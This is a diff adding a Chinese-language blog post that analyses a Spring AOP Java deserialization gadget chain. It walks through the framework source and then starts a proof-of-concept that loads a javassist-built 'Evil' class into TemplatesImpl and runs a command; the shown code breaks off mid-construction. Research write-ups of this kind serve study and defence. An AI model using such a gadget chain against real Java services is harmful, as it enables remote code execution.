+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">interceptorList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">(</span><span class="n">advisors</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">actualClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">targetClass</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">targetClass</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getDeclaringClass</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="n">Boolean</span><span class="w"> </span><span class="n">hasIntroductions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Advisor</span><span class="w"> </span><span class="n">advisor</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">advisors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">advisor</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">PointcutAdvisor</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="c1">// Add it conditionally.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">PointcutAdvisor</span><span class="w"> </span><span class="n">pointcutAdvisor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PointcutAdvisor</span><span class="p">)</span><span class="w"> </span><span class="n">advisor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">isPreFiltered</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">pointcutAdvisor</span><span class="p">.</span><span class="na">getPointcut</span><span class="p">().</span><span class="na">getClassFilter</span><span class="p">().</span><span class="na">matches</span><span class="p">(</span><span class="n">actualClass</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="n">MethodMatcher</span><span class="w"> </span><span class="n">mm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pointcutAdvisor</span><span class="p">.</span><span class="na">getPointcut</span><span class="p">().</span><span class="na">getMethodMatcher</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="kt">boolean</span><span class="w"> </span><span class="n">match</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mm</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">IntroductionAwareMethodMatcher</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hasIntroductions</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="n">hasIntroductions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hasMatchingIntroductions</span><span class="p">(</span><span class="n">advisors</span><span class="p">,</span><span class="w"> </span><span class="n">actualClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="n">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">IntroductionAwareMethodMatcher</span><span class="p">)</span><span class="w"> </span><span class="n">mm</span><span class="p">).</span><span class="na">matches</span><span class="p">(</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">actualClass</span><span class="p">,</span><span class="w"> </span><span class="n">hasIntroductions</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="n">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mm</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">actualClass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">match</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="n">MethodInterceptor</span><span class="o">[]</span><span class="w"> </span><span class="n">interceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getInterceptors</span><span class="p">(</span><span class="n">advisor</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">mm</span><span class="p">.</span><span class="na">isRuntime</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="c1">// Creating a new object instance in the getInterceptors() method</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="c1">// isn&#39;t a problem as we normally cache created chains.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">MethodInterceptor</span><span class="w"> </span><span class="n">interceptor</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">interceptors</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">								</span><span class="n">interceptorList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">InterceptorAndDynamicMethodMatcher</span><span class="p">(</span><span class="n">interceptor</span><span class="p">,</span><span class="w"> </span><span class="n">mm</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">							</span><span class="n">interceptorList</span><span class="p">.</span><span class="na">addAll</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">interceptors</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">						</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">advisor</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">IntroductionAdvisor</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">IntroductionAdvisor</span><span class="w"> </span><span class="n">ia</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">IntroductionAdvisor</span><span class="p">)</span><span class="w"> </span><span class="n">advisor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">config</span><span class="p">.</span><span class="na">isPreFiltered</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">ia</span><span class="p">.</span><span class="na">getClassFilter</span><span class="p">().</span><span class="na">matches</span><span class="p">(</span><span class="n">actualClass</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="n">Interceptor</span><span class="o">[]</span><span class="w"> </span><span class="n">interceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getInterceptors</span><span class="p">(</span><span class="n">advisor</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="n">interceptorList</span><span class="p">.</span><span class="na">addAll</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">interceptors</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">Interceptor</span><span class="o">[]</span><span class="w"> </span><span class="n">interceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getInterceptors</span><span class="p">(</span><span class="n">advisor</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">interceptorList</span><span class="p">.</span><span class="na">addAll</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">interceptors</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="n">interceptorList</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的config就是AdvisedSupport类，再看代码逻辑，最后返回的是interceptorList变量，而向这个变量中添加值的操作都是如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Interceptor</span><span class="o">[]</span><span class="w"> </span><span class="n">interceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">registry</span><span class="p">.</span><span class="na">getInterceptors</span><span class="p">(</span><span class="n">advisor</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">					</span><span class="n">interceptorList</span><span class="p">.</span><span class="na">addAll</span><span class="p">(</span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">(</span><span class="n">interceptors</span><span class="p">));</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>基本可以说是肯定会添加的，最后的else也是进行了这个添加的操作，可以看一下getInterceptors的判断逻辑，registry的获取：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503210135995.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503210135995"
+	
+	
+></p>
+<p>调用的DefaultAdvisorAdapterRegistry类的getInterceptors()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503211319395.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503211319395"
+	
+	
+></p>
+<p>关键的就是上述方法，先看需要利用的advisor变量，是Advisor类型，是一个接口类，找了一下实现类，发现DefaultIntroductionAdvisor类是可以利用的，实现了Serializable接口，可以序列化，并且getAdvice()方法返回实例化传进去的advice变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503213318168.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503213318168"
+	
+	
+></p>
+<p>（学完后我回来看了一下，从代码层面来讲，发现DefaultIntroductionAdvisor类在DefaultAdvisorChainFactory类的getInterceptorsAndDynamicInterceptionAdvice()方法中应该是会进入到else if语句，但是想要添加也是非常好控制的：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503235440273.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503235440273"
+	
+	
+></p>
+<p>AdvisedSupport类中的方法定义：
+<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250503235532495.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250503235532495"
+	
+	
+></p>
+<p>preFiltered变量默认为false，但是可以通过setPreFiltered()方法将其设置为true，具体就看要是下面的分析出错了再加吧。当然还可以控制第二个，反正为||，但是这样就需要看targetClass的匹配情况了。</p>
+<p>）</p>
+<p>再看getInterceptors()方法后续代码，只要getAdvice()方法返回的类实现了Advice接口和MethodInterceptor接口，就可以将这个类放入list中，而我们想要利用的是我们想要传入的是AspectJAroundAdvice类实例，这个类的父类AbstractAspectJAdvice实现了Advice接口，可以直接利用。</p>
+<p>但是这里其实有两条链子，区别点也是在这里，另外一种方法也挺有意思的，学习一下，两条链子主要的区别就是如下：</p>
+<ul>
+<li>找一个同时实现了Advice接口和MethodInterceptor接口并且可以利用的类，也就是前面分析的。</li>
+<li>第二个就是再加一层代理，这里也就是再次利用JdkDynamicAopProxy，通过JdkDynamicAopProxy来同时代理Advice和MethodInterceptor接口，并设置反射调用对象（target）是AspectJAroundAdvice，从而可以在调用到MethodInterceptor接口对应的方法时会继续链子的执行。这个就是对JdkDynamicAopProxy类的利用了，非常强大的类呀。</li>
+</ul>
+<p>所以这里其实有两条链子，下面分别再继续说一下。</p>
+<h2 id="poc构造">POC构造
+</h2><h4 id="链子一">链子一
+</h4><p>前面分析得基本已经非常清晰了，AspectJAroundAdvice类的父类AbstractAspectJAdvice(sink点的类)实现了advice接口，所以其实可以直接尝试利用，那么就用CC5的反序列化调用toString()方法打一个来触发代理：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Field</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJAroundAdvice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.SingletonAspectInstanceFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AopProxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJExpressionPointcut</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.support.DefaultIntroductionAdvisor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//使用javassist定义恶意代码</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ClassPool</span><span class="w"> </span><span class="n">classPool</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassPool</span><span class="p">.</span><span class="na">getDefault</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classPool</span><span class="p">.</span><span class="na">insertClassPath</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ClassClassPath</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">CtClass</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classPool</span><span class="p">.</span><span class="na">makeClass</span><span class="p">(</span><span class="s">&#34;Evil&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="w"> </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;open -a Calculator\&#34;);&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">makeClassInitializer</span><span class="p">().</span><span class="na">insertBefore</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cc</span><span class="p">.</span><span class="na">setSuperclass</span><span class="p">(</span><span class="n">classPool</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">AbstractTranslet</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getName</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">classBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cc</span><span class="p">.</span><span class="na">toBytecode</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[][]</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[][]</span><span class="p">{</span><span class="n">classBytes</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">impl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TemplatesImpl</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="s">&#34;_name&#34;</span><span class="p">,</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="s">&#34;_bytecodes&#34;</span><span class="p">,</span><span class="n">code</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_class&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">impl</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;_tfactory&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">TransformerFactoryImpl</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">method1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">impl</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;newTransformer&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJExpressionPointcut</span><span class="w"> </span><span class="n">pointcut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJExpressionPointcut</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SingletonAspectInstanceFactory</span><span class="w"> </span><span class="n">x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SingletonAspectInstanceFactory</span><span class="p">(</span><span class="n">impl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJAroundAdvice</span><span class="w"> </span><span class="n">aspectJAroundAdvice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AspectJAroundAdvice</span><span class="p">(</span><span class="n">method1</span><span class="p">,</span><span class="n">pointcut</span><span class="p">,</span><span class="n">x1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DefaultIntroductionAdvisor</span><span class="w"> </span><span class="n">decorator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultIntroductionAdvisor</span><span class="p">(</span><span class="n">aspectJAroundAdvice</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">impl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">addAdvisor</span><span class="p">(</span><span class="n">decorator</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
